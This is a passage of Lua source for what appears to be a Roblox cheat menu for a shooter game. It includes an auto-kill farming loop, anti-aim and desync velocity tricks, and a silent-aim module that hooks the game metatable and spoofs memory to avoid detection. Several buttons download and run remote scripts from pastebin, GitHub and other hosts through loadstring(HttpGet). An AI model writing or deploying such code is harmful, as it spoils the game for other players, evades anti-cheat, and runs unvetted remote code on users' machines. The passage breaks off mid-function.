        if v:FindFirstChild("[Knife]") and Plr.Character:FindFirstChild("[Knife]") == nil and Plr.Backpack:FindFirstChild("[Knife]") == nil then
            Plr.Character.HumanoidRootPart.CFrame = v.CFrame
            wait(1)
        end
    end
    for i, v in pairs(character:GetChildren()) do
        if v:FindFirstChild("LocalScript") then
            v:Destroy()
        end
    end
end

e(Plr.character)
local target
while wait() do
    target = nil
    local highest = 0
    for i, v in pairs(game.Players:GetPlayers()) do
        if v:FindFirstChild("DataFolder") and v.Character:FindFirstChild("FULLY_LOADED_CHAR") and v.Character.BodyEffects:FindFirstChild("Defense") and tonumber(v.DataFolder.Information.Wanted.Value) > 500 and tonumber(v.DataFolder.Information.Wanted.Value) >= highest and v.Character.BodyEffects:FindFirstChild("Armor") then
            target = v 
            highest = tonumber(v.DataFolder.Information.Wanted.Value)
        end
    end
    if not target then serverhop() end
    local e = true
    local penis = 0
    local bagged = false
    local A = false
    spawn(function() pcall(function()
        while bagged == false do
            if target and target.Character and target.Character:FindFirstChild("Christmas_Sock") == nil and penis <= 5 and Plr.Character.Humanoid.Health > 80 then
                if Plr.Backpack:FindFirstChild("[BrownBag]") == nil then
                    A = false
                    pcall(function()
                        repeat wait()
                            Plr.character.HumanoidRootPart.CFrame = CFrame.new(-316.034454, 48.2788467, -723.860474, 0.983254969, -0.000297372608, -0.182234928, 0.000218386791, 0.999999881, -0.000453495246, 0.182235047, 0.000406103791, 0.98325491)
                            fireclickdetector(game:GetService("Workspace").Ignored.Shop["[BrownBag] - $25"].ClickDetector)
                        until Plr.Backpack:FindFirstChild("[BrownBag]") ~= nil
                    end)
                    A = true
                end
                Plr.Character.Humanoid:EquipTool(Plr.Backpack["[BrownBag]"])
                Plr.Character["[BrownBag]"]:Activate()
                penis = penis + 1
            elseif penis >= 2 or target.Character:FindFirstChild("Christmas_Sock") or not target then
                bagged = true
            end
            wait(3)
        end
    end) end)
    spawn(function()
        while e do wait()
            pcall(function()
                if Plr.Character.Humanoid.Health > 80 then
                    if not target.Character.BodyEffects["K.O"].Value then
                        if A then
                            Plr.Character.HumanoidRootPart.CFrame = CFrame.new(target.Character.UpperTorso.Position + Vector3.new(0, -5, 0))
                        end
                    else
                        Plr.Character.HumanoidRootPart.CFrame = target.Character.UpperTorso.CFrame
                    end
                else
                    Plr.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
                    if Plr.Character:FindFirstChild("[Taco]") == nil or Plr.Backpack:FindFirstChild("[Taco]") == nil then
                        Plr.Character.HumanoidRootPart.CFrame = game.Workspace.Ignored.Shop["[Taco] - $2"].Head.CFrame
                        wait(0.5)
                        fireclickdetector(game.Workspace.Ignored.Shop["[Taco] - $2"].ClickDetector)
                    end
                    pcall(function()Plr.Character.Humanoid:EquipTool(Plr.Backpack["[Taco]"])end)
                    pcall(function()
                        Plr.Character["[Taco]"]:Activate()
                        wait(0.1)
                        Plr.Character["[Taco]"]:Deactivate()
                    end)
                end
            end)
        end
    end)
    repeat wait() until bagged
    pcall(function()
        repeat wait()
            repeat wait()
                pcall(function()
                if Plr.Character.Humanoid.Health > 80 then
                    pcall(function()Plr.Character.Humanoid:EquipTool(Plr.Backpack["[Knife]"])end)
                    wait(0.1)
                        Plr.Character["[Knife]"].GripPos = Vector3.new(0, 5, 0)
                        Plr.Character["[Knife]"].Handle.Size = Vector3.new(20, 20, 20)
                        Plr.Character["[Knife]"]:Activate()
                        wait(1.25)
                        Plr.Character["[Knife]"]:Deactivate()
                        wait(1.25)
                    end
                end)
            until not target or target.Character.BodyEffects["K.O"].Value or game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.V)
            repeat wait() 
                if Plr.Character.Humanoid.Health > 80 then
                    pcall(function()Plr.Character.Humanoid:EquipTool(Plr.Backpack.Cuff)end)
                    pcall(function()
                        wait(3)
                        Plr.Character.Cuff:Activate()
                        wait(3)
                        Plr.Character.Cuff:Deactivate()
                    end)
                end
            until not target.Character.BodyEffects["K.O"].Value or game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.V)
        until tonumber(target.DataFolder.Information.Wanted.Value) == 0 or game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.V)
    end)
    e = false
end
  	end    
})







local AaSec = Misc:AddSection({
	Name = "Anti locks/Anti aim"
})
AaSec:AddButton({
	Name = "Underground AA (N)",
	Callback = function()
local Toggled = false
local KeyCode = 'n'


function AA()
    local oldVelocity = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(oldVelocity.X, -70, oldVelocity.Z)
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(oldVelocity.X, oldVelocity.Y, oldVelocity.Z)
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(oldVelocity.X, -70, oldVelocity.Z)
    game.Players.LocalPlayer.Character.Humanoid.HipHeight = 3.05
end

game:GetService('UserInputService').InputBegan:Connect(function(Key)
    if Key.KeyCode == Enum.KeyCode[KeyCode:upper()] and not game:GetService('UserInputService'):GetFocusedTextBox() then
        if Toggled then
            Toggled = false
            game.Players.LocalPlayer.Character.Humanoid.HipHeight = 2.6

        elseif not Toggled then
            Toggled = true

            while Toggled do
                AA()
                task.wait()
            end
        end
    end
end)
		end
})
AaSec:AddButton({
	Name = "Underground AA (X)",
	Callback = function()
local Toggled = false
local KeyCode = 'x'


function AA()
    local oldVelocity = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(oldVelocity.X, -70, oldVelocity.Z)
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(oldVelocity.X, oldVelocity.Y, oldVelocity.Z)
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(oldVelocity.X, -70, oldVelocity.Z)
    game.Players.LocalPlayer.Character.Humanoid.HipHeight = 4.14
end

game:GetService('UserInputService').InputBegan:Connect(function(Key)
    if Key.KeyCode == Enum.KeyCode[KeyCode:upper()] and not game:GetService('UserInputService'):GetFocusedTextBox() then
        if Toggled then
            Toggled = false
            game.Players.LocalPlayer.Character.Humanoid.HipHeight = 1.85

        elseif not Toggled then
            Toggled = true

            while Toggled do
                AA()
                task.wait()
            end
        end
    end
end)
	end
})
AaSec:AddButton({
	Name = "Underground AA (V)",
	Callback = function()
		local Toggled = true
local KeyCode = 'v'


function AA()
    local oldVelocity = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(oldVelocity.X, -70, oldVelocity.Z)
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(oldVelocity.X, oldVelocity.Y, oldVelocity.Z)
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(oldVelocity.X, -70, oldVelocity.Z)
    game.Players.LocalPlayer.Character.Humanoid.HipHeight = 4.14
end

game:GetService('UserInputService').InputBegan:Connect(function(Key)
    if Key.KeyCode == Enum.KeyCode[KeyCode:upper()] and not game:GetService('UserInputService'):GetFocusedTextBox() then
        if Toggled then
            Toggled = false
            game.Players.LocalPlayer.Character.Humanoid.HipHeight = 1.85

        elseif not Toggled then
            Toggled = true

            while Toggled do
                AA()
                task.wait()
            end
        end
    end
end)

	end
})
AaSec:AddButton({
	Name = "Jumpable aa",
	Callback = function()
	_G.BlizexJumpableAnti= true

    game.RunService.Heartbeat:Connect(function()
        if _G.BlizexJumpableAnti    
      then  local  CurrentVelocity = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
        game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(1000,1000,1000)
        game.RunService.RenderStepped:Wait()
        game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = CurrentVelocity
        end    
    end)

end
})
AaSec:AddButton({
	Name = "Sky ( no toggle )",
	Callback = function()
	getgenv().Sky = true 
getgenv().SkyAmount = 825

game:GetService("RunService").heartbeat:Connect(function()
    if getgenv().Sky ~= false then 
    local vel = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,      getgenv().SkyAmount,0) 
    game:GetService("RunService").RenderStepped:Wait()
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = vel
    end 
end)
end
})
AaSec:AddButton({
	Name = "Sky 2 ( no toggle ) ",
	Callback = function()
	getgenv().Sky = true 
getgenv().SkyAmount = 970

game:GetService("RunService").heartbeat:Connect(function()
    if getgenv().Sky ~= false then 
    local vel = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,      getgenv().SkyAmount,0) 
    game:GetService("RunService").RenderStepped:Wait()
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = vel
    end 
end)
end
})
AaSec:AddButton({
	Name = "Sky 3 (Y)",
	Callback = function()
	getgenv().Mode = "Sky" --// Modes: Underground, Sky, Prediction Changer
getgenv().KeyBind = "y" --// Key to press to enable
getgenv().PredictionAmount = "2" --// Number to change prediction to

loadstring(game:HttpGet('https://fourdevils.gq/anti-aim-hub.lua'))()
end
})
AaSec:AddButton({
	Name = "Prediction breaker (Y )",
	Callback = function()
	-- sub to halal gaming

getgenv().Mode = "Prediction Changer" --// Modes: Underground, Sky, Prediction Changer
getgenv().KeyBind = "y" --// Key to press to enable
getgenv().PredictionAmount = "90" --// Number to change prediction to

loadstring(game:HttpGet('https://fourdevils.gq/anti-aim-hub.lua'))()
  	end    
})
local desync = Misc:AddSection({
	Name = "Desync"
})
desync:AddButton({
	Name = "Obivity desync x ",
	Callback = function()
	loadstring(game:HttpGet("https://pastebin.com/raw/LB3APf3H"))()
	end
})
desync:AddButton({
	Name = "Demise desync",
	Callback = function()
	getgenv().demisethebest = true 

game:GetService("RunService").heartbeat:Connect(function()
    if getgenv().demisethebest == true then 
    local abc = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(1,1,1) * (2^16)
    game:GetService("RunService").RenderStepped:Wait()
    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = abc
    end 
end)
  	end    
})
desync:AddButton({
	Name = "Walkable desync",
	Callback = function()
	loadstring(game:HttpGet("https://pastebin.com/raw/CDQayjEH"))()
	end
})





AaSec:AddButton({
	Name = "All type aa resolver ( creds paws ) ",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Trexxus/Resolver/main/Res.lua"))()
	end
})
AaSec:AddButton({
	Name = "Octel resolver",
	Callback = function()
	local RunService = game:GetService("RunService")

local function zeroOutYVelocity(hrp)
    hrp.Velocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)
    hrp.AssemblyLinearVelocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)
end

local function onPlayerAdded(player)
    player.CharacterAdded:Connect(function(character)
        local hrp = character:WaitForChild("HumanoidRootPart")
        zeroOutYVelocity(hrp)
    end)
end

local function onPlayerRemoving(player)
    player.CharacterAdded:Disconnect()
end

game.Players.PlayerAdded:Connect(onPlayerAdded)
game.Players.PlayerRemoving:Connect(onPlayerRemoving)

RunService.Heartbeat:Connect(function()
    pcall(function()
        for i, player in pairs(game.Players:GetChildren()) do
            if player.Name ~= game.Players.LocalPlayer.Name then
                local hrp = player.Character.HumanoidRootPart
                zeroOutYVelocity(hrp)
            end
        end
    end)
end)
end
})
--[[
AaSec:AddButton({
	Name = "Velocity resolver ",
	Callback = function()
	loadstring(game:HttpGet("https://pastebin.com/raw/6UdTKxRU"))() 
  	end    
})
AaSec:AddButton({
	Name = "Underground resolver",
	local RunService = game:GetService("RunService")

RunService.Heartbeat:Connect(function()
    pcall(function()
        for i,v in pairs(game.Players:GetChildren()) do
            if v.Name ~= game.Players.LocalPlayer.Name then
                local hrp = v.Character.HumanoidRootPart
                hrp.Velocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)    
                hrp.AssemblyLinearVelocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)   
            end
        end
    end)
end)
end
})
--]]









SilentSec:AddButton({
	Name = "Oz silent",
	Callback = function()
getgenv().Settings = {
    Silent = {
        SilentToggle = "p",
        Enabled = true,
        AimPart = "HumanoidRootPart",
        Prediction = 0.1437,
        ClosestPart = true,
        HitChance = 100,
        AntiGroundshot = true,
        PredictMovement = true,
        UseAirPart = true,
        AirPart = "LowerTorso"
    },
    FOV = {
        Visible = true,
        Radius = 65,
        Filled = false,
    },
    Checks = {
        WallCheck = true,
        UnlockedOnDeath = true,
        CrewCheck = false,
    },
    AutoGunFov = {
        ["Enabled"] = (true), -- // Gun Fov 
        ["Double-Barrel SG"] = {["FOV"] = 34}, -- // Db
        ["Revolver"] = {["FOV"] = 65}, -- // Rev
        ["SMG"] = {["FOV"] = 65}, -- // Smg
        ["Shotgun"] = {["FOV"] = 20}, -- // Shotgun
        ["Rifle"] = {["FOV"] = 26}, -- // Rifle
        ["TacticalShotgun"] = {["FOV"] = 430}, -- // Rev
        ["Silencer"] = {["FOV"] = 170}, -- // Smg
        ["AK47"] = {["FOV"] = 130}, -- // Shotgun
        ["P90"] = {["FOV"] = 120}, -- // Rifle
        ["Glock"] = {["FOV"] = 120}, -- // Rifle
        ["RPG"] = {["FOV"] = 120}, --// Rpg 
        ["AR"] = {["FOV"] = 120} 
    },
    AimAssist = {
        Enable = true,
        ToggleKey = true,
        UseKeyBoardKey = true,
        KeyBoardKey = Enum.KeyCode.C,
        ThirdPerson = true,
        FirstPerson = true,
        AutoPingSets = true,
        UseCircleRadius = false,
        DisableOutSideCircle = false,
        UseShake = true,
        ShakePower = 100,
        CheckForWalls = true,
    },
    Check = {
        CheckIfKo = true,
        DisableOnPlayerDeath = true,
    },
    Prediction = {
        PredictMovement = true,
        PredictionVelocity = 0.14,
    },
    Smooth = {
        Smoothness = true,
        SmoothnessAmount = 0.32,
    },
    Part = {
        AimPart = "Head",
        CheckIfJumpedAimPart = "HumanoidRootPart",
        CheckIfJumped = true,
        GetClosestPart = true,
    },
    Resolver = {---- this is for camlock
        UnderGround = true,
        DetectDesync = true,
    },
    Visual = {
        Fov = false,
        FovTransparency = 1,
        FovThickness = 1,
        FovColor = Color3.fromRGB(255, 185, 255),
        FovRadius = 360,
    },
    Spoofer = {
        MemorySpoofer = true,
        MemoryTabColor = Color3.fromRGB(211, 88, 33),
        MemoryMost = 85000,
        MemoryLeast = 80000,
        
  
    },
    }

  if not LPH_OBFUSCATED then
    LPH_NO_VIRTUALIZE = function(...)
        return (...)
    end
    LPH_NO_VIRTUALIZE = function(...)
        return (...)
    end
  end
  
  LPH_NO_VIRTUALIZE(
    function()
        local Players, Client, Mouse, RS, Camera, r =
            game:GetService("Players"),
            game:GetService("Players").LocalPlayer,
            game:GetService("Players").LocalPlayer:GetMouse(),
            game:GetService("RunService"),
            game.Workspace.CurrentCamera,
            math.random
  local Circle = Drawing.new("Circle")
  Circle.Color = Color3.new(180, 180, 255)
  Circle.Transparency = 0.5
  Circle.Thickness = 1
  
  local Prey = nil
  local Plr  = nil
  local OldSilentAimPart = getgenv().Settings.Silent.AirPart
  
  local Vec2 = function(property)
  return Vector2.new(property.X, property.Y + (game:GetService("GuiService"):GetGuiInset().Y))
  end
  
  local UpdateSilentFOV = function()
  if not Circle then
    return Circle
  end
  Circle.Visible = getgenv().Settings.FOV["Visible"]
  Circle.Radius = getgenv().Settings.FOV["Radius"] * 3.05
  Circle.Filled = getgenv().Settings.FOV["Filled"]
  Circle.Position = Vec2(Mouse)
  local chance = CalcChance(Settings.Silent.HitChance)
  if not chance then
    return nil
  end
  
  
  
  return Circle
  end
  
  
  game.RunService.RenderStepped:Connect(
  function()
    UpdateSilentFOV()
  end
  )
  
  local WallCheck = function(destination, ignore)
  if getgenv().Settings.Checks.WallCheck then
    local Origin = Camera.CFrame.p
    local CheckRay = Ray.new(Origin, destination - Origin)
    local Hit = game.workspace:FindPartOnRayWithIgnoreList(CheckRay, ignore)
    return Hit == nil
  else
    return true
  end
  end
  
  if getgenv().Settings.Checks.CrewCheck == true then
    while true do
        local newPlayer = game.Players.PlayerAdded:wait()
        if player:IsInGroup(newPlayer.Group) then
            table.insert(Ignored.Players, newPlayer)
        end
    end
  end
  
  GetClosestToMouse = function()
  local Target, Closest = nil, 1 / 0
  
  for _, v in pairs(Players:GetPlayers()) do
    if (v.Character and v ~= Client and v.Character:FindFirstChild("HumanoidRootPart")) then
        local Position, OnScreen = Camera:WorldToScreenPoint(v.Character.HumanoidRootPart.Position)
        local Distance = (Vector2.new(Position.X, Position.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
  
        if
            (Circle.Radius > Distance and Distance < Closest and OnScreen and
                WallCheck(v.Character.HumanoidRootPart.Position, {Client, v.Character}))
         then
            Closest = Distance
            Target = v
        end
    end
  end
  return Target
  end
  
  function TargetChecks(Target)
  if getgenv().Settings.Checks.UnlockedOnDeath == true and Target.Character then
    return Target.Character.BodyEffects["K.O"].Value and true or false
  end
  return false
  end
  
  function PredictionictTargets(Target, Value)
  return Target.Character[getgenv().Settings.Silent.AimPart].CFrame +
    (Target.Character.Humanoid.MoveDirection * Value * 16)
  end
  
  
  local WTS = function(Object)
  local ObjectVector = Camera:WorldToScreenPoint(Object.Position)
  return Vector2.new(ObjectVector.X, ObjectVector.Y)
  end
  
  local IsOnScreen = function(Object)
  local IsOnScreen = Camera:WorldToScreenPoint(Object.Position)
  return IsOnScreen
  end
  
  local FilterObjs = function(Object)
  if string.find(Object.Name, "Gun") then
    return
  end
  if table.find({"Part", "MeshPart", "BasePart"}, Object.ClassName) then
    return true
  end
  end
  
  Mouse.KeyDown:Connect(
  function(Key)
    if (Key == getgenv().Settings.Silent.SilentToggle:lower()) then
        if getgenv().Settings.Silent.Enabled == true then
            getgenv().Settings.Silent.Enabled = false
        else
            getgenv().Settings.Silent.Enabled = true
        end
    end
  end
  )
  RS.Heartbeat:Connect(function()
  if getgenv().Settings.Silent.Enabled then
      if Prey and Prey.Character and Prey.Character:WaitForChild(getgenv().Settings.Silent.AimPart) then
            if getgenv().Settings.Resolve.Desync == true and Prey.Character:WaitForChild("HumanoidRootPart").Velocity.magnitude > getgenv().Settings.Resolve.Desync then            
                pcall(function()
                    local TargetVel = Prey.Character[getgenv().Settings.Silent.AimPart]
                    TargetVel.Velocity = Vector3.new(0.36, 0.21, 0.34)
                    TargetVel.AssemblyLinearVelocity = Vector3.new(0.36, 0.21, 0.34)
                end)
            end
            if getgenv().Settings.Silent.AntiGroundShots == true and Prey.Character:FindFirstChild("Humanoid") == Enum.HumanoidStateType.Freefall then
                pcall(function()
                    local TargetVelv5 = Prey.Character[getgenv().Settings.Silent.AimPart]
                    TargetVelv5.Velocity = Vector3.new(TargetVelv5.Velocity.X, (TargetVelv5.Velocity.Y * 0.2), TargetVelv5.Velocity.Z)
                    TargetVelv5.AssemblyLinearVelocity = Vector3.new(TargetVelv5.Velocity.X, (TargetVelv5.Velocity.Y * 0.2), TargetVelv5.Velocity.Z)
                end)
            end
            if getgenv().Settings.Resolve.UnderGround == true then            
                pcall(function()
                    local TargetVelv2 = Prey.Character[getgenv().Settings.Silent.AimPart]
                    TargetVelv2.Velocity = Vector3.new(TargetVelv2.Velocity.X, 0, TargetVelv2.Velocity.Z)
                    TargetVelv2.AssemblyLinearVelocity = Vector3.new(TargetVelv2.Velocity.X, 0, TargetVelv2.Velocity.Z)
                end)
            end
            if getgenv().Settings.Resolve.SkyAA == true and AimlockTarget and AimlockTarget.Character and
            AimlockTarget.Character:WaitForChild("HumanoidRootPart").Velocity.magnitude >
                getgenv().Settings.Resolve.SkyAA
     then
        pcall(
            function()
                local TargetVel = AimlockTarget.Character[getgenv().Settings.Part.AimPart]
                TargetVel.Velocity = Vec3(0.36, 0.21, 0.34)
                TargetVel.AssemblyLinearVelocity = Vec3(0.36, 0.21, 0.34)
            end
        )
    end
            if getgenv().Settings.Silent.UseAirPart == true and Prey.Character:FindFirstChild("Humanoid") then
                if Prey.Character.Humanoid.FloorMaterial == Enum.Material.Air and Prey.Character.Humanoid.Jump == true then
                    getgenv().Settings.Silent.Part = getgenv().Settings.Silent.AirPart
                else
                    getgenv().Settings.Silent.Part = OldSilentAimPart
                end
            end
      end
  end
    if getgenv().Settings.CamLock.Enabled == true then
        if getgenv().Settings.CamLock.DesyncRES == true and Plr and Plr.Character and Plr.Character:WaitForChild(getgenv().Settings.CamLock.AimPart) and Plr.Character:WaitForChild("HumanoidRootPart").Velocity.magnitude > getgenv().Settings.CamLock.DesyncRES then
            pcall(function()
                local TargetVelv3 = Plr.Character[getgenv().Settings.CamLock.AimPart]
                TargetVelv3.Velocity = Vector3.new(0, 0, 0)
                TargetVelv3.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
            end)
        end
        if getgenv().Settings.CamLock.UnderGroundRES == true and Plr and Plr.Character and Plr.Character:WaitForChild(getgenv().Settings.CamLock.AimPart)then
            pcall(function()
                local TargetVelv4 = Plr.Character[getgenv().Settings.CamLock.AimPart]
                TargetVelv4.Velocity = Vector3.new(TargetVelv4.Velocity.X, 0, TargetVelv4.Velocity.Z)
                TargetVelv4.AssemblyLinearVelocity = Vector3.new(TargetVelv4.Velocity.X, 0, TargetVelv4.Velocity.Z)
            end)
        end
    end
  end)
  
  RS.RenderStepped:Connect(
  function()
    if prey then
        if prey ~= nil and getgenv().Settings.Silent.Enabled and getgenv().Settings.Silent.ClosestPart == true then
            getgenv().Settings.Silent["AimPart"] = tostring(GetClosestBodyPart(prey.Character))
        end
    end
  end
  )
  
  
  game:GetService("CorePackages").Packages:Destroy()
  
  
  
  local grmt = getrawmetatable(game)
  local index = grmt.__index
  local properties = {
  "Hit" -- Ill Add more Mouse properties soon,
  }
  setreadonly(grmt, false)
  
  grmt.__index =
  newcclosure(
  function(self, v)
    if Mouse and (table.find(properties, v)) then
        prey = GetClosestToMouse()
        if prey ~= nil and getgenv().Settings.Silent.Enabled and not TargetChecks(prey) then
            local endpoint = PredictionictTargets(prey, getgenv().Settings.Silent.Prediction)
  
            return (table.find(properties, tostring(v)) and endpoint)
        end
    end
    return index(self, v)
  end
  )
  
  
  
  local Script = {Functions = {}}
    Script.Functions.getToolName = function(name)
        local split = string.split(string.split(name, "[")[2], "]")[1]
        return split
    end
    Script.Functions.getEquippedWeaponName = function()
        if (Client.Character) and Client.Character:FindFirstChildWhichIsA("Tool") then
           local Tool =  Client.Character:FindFirstChildWhichIsA("Tool")
           if string.find(Tool.Name, "%[") and string.find(Tool.Name, "%]") and not string.find(Tool.Name, "Wallet") and not string.find(Tool.Name, "Phone") then
              return Script.Functions.getToolName(Tool.Name)
           end
        end
        return nil
    end
    RS.RenderStepped:Connect(function()
    if Script.Functions.getEquippedWeaponName() ~= nil then
        local WeaponSettings = getgenv().Settings.AutoGunFov[Script.Functions.getEquippedWeaponName()]
        if WeaponSettings ~= nil and getgenv().Settings.AutoGunFov.Enabled == true then
            getgenv().Settings.FOV.Radius = WeaponSettings.FOV
        else
            getgenv().Settings.FOV.Radius = getgenv().Settings.FOV.Radius
        end
    end
  end)
  
  -- // Locals
  
  local Players, Uis, RService, Inset, CurrentCamera = 
  game:GetService("Players"), 
  game:GetService("UserInputService"), 
  game:GetService("RunService"),
  game:GetService("GuiService"):GetGuiInset().Y,
  game:GetService("Workspace").CurrentCamera
  
  local Client = Players.LocalPlayer;
  
  local Mouse, Camera = Client:GetMouse(), workspace.CurrentCamera
  
  local Circle = Drawing.new("Circle")
  
  local CF, RNew, Vec3, Vec2 = CFrame.new, Ray.new, Vector3.new, Vector2.new
  
  local OldAimPart = getgenv().Settings.Part.AimPart
  
  local AimlockTarget, MousePressed, CanNotify = nil, false, false
  
  getgenv().UpdateFOV = function()
    if (not Circle) then
        return (Circle)
    end
    Circle.Color = Settings.Visual.FovColor
    Circle.Visible = Settings.Visual.Fov
    Circle.Radius = Settings.Visual.FovRadius
    Circle.Thickness = Settings.Visual.FovThickness
    Circle.Position = Vec2(Mouse.X, Mouse.Y + Inset)
    return (Circle)
  end
  
  RService.Heartbeat:Connect(UpdateFOV)
  
  -- // Functions
  
  getgenv().WallCheck = function(destination, ignore)
    local Origin = Camera.CFrame.p
    local CheckRay = RNew(Origin, destination - Origin)
    local Hit = game.workspace:FindPartOnRayWithIgnoreList(CheckRay, ignore)
    return Hit == nil
  end
  
  getgenv().WTS = function(Object)
    local ObjectVector = Camera:WorldToScreenPoint(Object.Position)
    return Vec2(ObjectVector.X, ObjectVector.Y)
  end
  
  getgenv().IsOnScreen = function(Object)
    local IsOnScreen = Camera:WorldToScreenPoint(Object.Position)
    return IsOnScreen
  end
  
  getgenv().FilterObjs = function(Object)
    if string.find(Object.Name, "Gun") then
        return
    end
    if table.find({"Part", "MeshPart", "BasePart"}, Object.ClassName) then
        return true
    end
  end
  
  getgenv().GetClosestBodyPart = function(character)
    local ClosestDistance = 1 / 0
    local BodyPart = nil
    if (character and character:GetChildren()) then
        for _, x in next, character:GetChildren() do
            if FilterObjs(x) and IsOnScreen(x) then
                local Distance = (WTS(x) - Vec2(Mouse.X, Mouse.Y)).Magnitude
                if (Circle.Radius > Distance and Distance < ClosestDistance) then
                    ClosestDistance = Distance
                    BodyPart = x
                end
            end
        end
    end
    return BodyPart
  end
  
  getgenv().WorldToViewportPoint = function(P)
    return Camera:WorldToViewportPoint(P)
  end
  
  getgenv().WorldToScreenPoint = function(P)
    return Camera.WorldToScreenPoint(Camera, P)
  end
  
  getgenv().GetObscuringObjects = function(T)
    if T and T:FindFirstChild(getgenv().Settings.Part.AimPart) and Client and Client.Character:FindFirstChild("Head") then
        local RayPos =
            workspace:FindPartOnRay(RNew(T[getgenv().Settings.Part.AimPart].Position, Client.Character.Head.Position))
        if RayPos then
            return RayPos:IsDescendantOf(T)
        end
    end
  end
  
  getgenv().GetNearestTarget = function()
    local AimlockTarget, Closest = nil, 1 / 0
  
    for _, v in pairs(game:GetService("Players"):GetPlayers()) do
        if (v.Character and v ~= Client and v.Character:FindFirstChild("HumanoidRootPart")) then
            local Position, OnScreen = Camera:WorldToScreenPoint(v.Character.HumanoidRootPart.Position)
            local Distance = (Vec2(Position.X, Position.Y) - Vec2(Mouse.X, Mouse.Y)).Magnitude
            if Settings.AimAssist.CheckForWalls then
                if
                    (Circle.Radius > Distance and Distance < Closest and OnScreen and
                        getgenv().WallCheck(v.Character.HumanoidRootPart.Position, {Client, v.Character}))
                 then
                    Closest = Distance
                    AimlockTarget = v
                end
            elseif Settings.AimAssist.UseCircleRadius then
                if
                    (Circle.Radius > Distance and Distance < Closest and OnScreen and
                        getgenv().WallCheck(v.Character.HumanoidRootPart.Position, {Client, v.Character}))
                 then
                    Closest = Distance
                    AimlockTarget = v
                end
            else
                if (Circle.Radius > Distance and Distance < Closest and OnScreen) then
                    Closest = Distance
                    AimlockTarget = v
                end
            end
        end
    end
    return AimlockTarget
  end
  
  -- // Use KeyBoardKey Function
  
  Uis.InputBegan:connect(
    function(input)
        if
            input.KeyCode == Settings.AimAssist.KeyBoardKey and Settings.AimAssist.UseKeyBoardKey == true and
                getgenv().Settings.AimAssist.Enable == true and
                AimlockTarget == nil and
                getgenv().Settings.AimAssist.HoldKey == true
         then
            pcall(
                function()
                    MousePressed = true
                    AimlockTarget = GetNearestTarget()
                end
            )
        end
    end
  )
  
  Uis.InputBegan:Connect(
    function(keyinput, stupid)
        if
            keyinput.KeyCode == Settings.AimAssist.KeyBoardKey and Settings.AimAssist.UseKeyBoardKey == true and
                getgenv().Settings.AimAssist.Enable == true and
                AimlockTarget == nil and
                getgenv().Settings.AimAssist.ToggleKey == true
         then
            pcall(
                function()
                    MousePressed = true
                    AimlockTarget = GetNearestTarget()
                end
            )
        elseif
            keyinput.KeyCode == Settings.AimAssist.KeyBoardKey and Settings.AimAssist.UseKeyBoardKey == true and
                getgenv().Settings.AimAssist.Enable == true and
                AimlockTarget ~= nil
         then
            AimlockTarget = nil
            MousePressed = false
        end
    end
  )
  
  -- // AimAssist Functions. RunService HeartBeat.
  
  task.spawn(
    function()
        while task.wait() do
            if MousePressed == true and getgenv().Settings.AimAssist.Enable == true then
                if AimlockTarget and AimlockTarget.Character then
                    if getgenv().Settings.Part.GetClosestPart == true then
                        getgenv().Settings.Part.AimPart = tostring(GetClosestBodyPart(AimlockTarget.Character))
                    end
                end
                if getgenv().Settings.AimAssist.DisableOutSideCircle == true and AimlockTarget and AimlockTarget.Character then
                    if
                        Circle.Radius <
                            (Vec2(
                                Camera:WorldToScreenPoint(AimlockTarget.Character.HumanoidRootPart.Position).X,
                                Camera:WorldToScreenPoint(AimlockTarget.Character.HumanoidRootPart.Position).Y
                            ) - Vec2(Mouse.X, Mouse.Y)).Magnitude
                     then
                        AimlockTarget = nil
                    end
                end
            end
        end
    end
  )
  
  RService.Heartbeat:Connect(
    function()
        if getgenv().Settings.AimAssist.Enable == true and MousePressed == true then
            if getgenv().Settings.AimAssist.UseShake == true and AimlockTarget and AimlockTarget.Character then
                pcall(
                    function()
                        local TargetVelv1 = AimlockTarget.Character[getgenv().Settings.Part.AimPart]
                        TargetVelv1.Velocity =
                            Vec3(TargetVelv1.Velocity.X, TargetVelv1.Velocity.Y, TargetVelv1.Velocity.Z) +
                            Vec3(
                                math.random(-getgenv().Settings.AimAssist.ShakePower, getgenv().Settings.AimAssist.ShakePower),
                                math.random(-getgenv().Settings.AimAssist.ShakePower, getgenv().Settings.AimAssist.ShakePower),
